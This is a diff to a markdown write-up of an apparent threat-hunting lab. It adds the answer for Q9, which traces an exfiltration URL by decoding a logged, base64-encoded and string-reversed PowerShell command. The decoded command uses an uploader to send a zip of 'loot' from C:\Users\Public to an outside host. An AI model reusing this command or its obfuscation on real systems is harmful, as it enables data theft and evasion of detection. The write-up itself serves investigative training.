@@ -86,11 +86,44 @@ If a result is returned, then the process was executed on Megan's machine.<br><b
 
 
 **Q9. What is the full URL where the files were exfiltrated to?**<br>
+From previous query, the process commandline column.<br><br>
+
+```
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$enc = 'QzpcV2luZG93c1xTeXN0ZW0zMlxwb3dlcnNoZWxsLmV4ZSAtTm9wIC1FeGVjdXRpb25Qb2xpY3kgYnlwYXNzIC1Db21tYW5kICIkcmV2ID0gJzMgeXJ0ZXItLSBCTTUgZXppcy1rbnVoYy0tIHRweXJjbmUtLSBuaWhzdXB0aXRlZWthbnRyYXBlcmVodGFrb29sb3RuaWh0b250bmlhL21vYy55cnJlYmVsa2N1aC1ydW95LW1pLy86cHR0aCB0c2VkLS0gcGl6LnRvb2xfZGVvc3NhbFxjaWxidVBcc3Jlc1VcOkMgZWxpZi0tIGV4ZS5yZWRhb2xwdS1kZWNuYXZkYSc7JHJldls6Oi0xXSI=';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))"
+```
+<br>
+
+Within the data above is a string can covert from Base 64.<br><br>
+
+Base 64.<br><br>
+
+```
+QzpcV2luZG93c1xTeXN0ZW0zMlxwb3dlcnNoZWxsLmV4ZSAtTm9wIC1FeGVjdXRpb25Qb2xpY3kgYnlwYXNzIC1Db21tYW5kICIkcmV2ID0gJzMgeXJ0ZXItLSBCTTUgZXppcy1rbnVoYy0tIHRweXJjbmUtLSBuaWhzdXB0aXRlZWthbnRyYXBlcmVodGFrb29sb3RuaWh0b250bmlhL21vYy55cnJlYmVsa2N1aC1ydW95LW1pLy86cHR0aCB0c2VkLS0gcGl6LnRvb2xfZGVvc3NhbFxjaWxidVBcc3Jlc1VcOkMgZWxpZi0tIGV4ZS5yZWRhb2xwdS1kZWNuYXZkYSc7JHJldls6Oi0xXSI=
+```
+<br>
+
+Using Cyberchef, convert it from Base 64.<br><br>
+
+```
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$rev = '3 yrter-- BM5 ezis-knuhc-- tpyrcne-- nihsuptiteekantraperehtakoolotnihtontnia/moc.yrrebelkcuh-ruoy-mi//:ptth tsed-- piz.tool_deossal\cilbuP\sresU\:C elif-- exe.redaolpu-decnavda';$rev[::-1]"
+```
+<br>
+
+Appears the output is in reverse. Can reverse the output in Cyberchef.<br><br>
+
+```
+]1-::[ver$;'advanced-uploader.exe --file C:\Users\Public\lassoed_loot.zip --dest http://im-your-huckleberry.com/aintnothintolookatherepartnakeetitpushin --encrypt --chunk-size 5MB --retry 3' = ver$
+```
+<br>
+
+
+
+**Answer: http://im-your-huckleberry.com/aintnothintolookatherepartnakeetitpushin**<br><br>
+
+**Q10. What database table contains evidence of employee logins?**<br>
 
 **Answer: **<br><br>
-**Q.**<br>
 
-**Answer: **<br><br>
 **Q.**<br>
 
 **Answer: **<br><br>
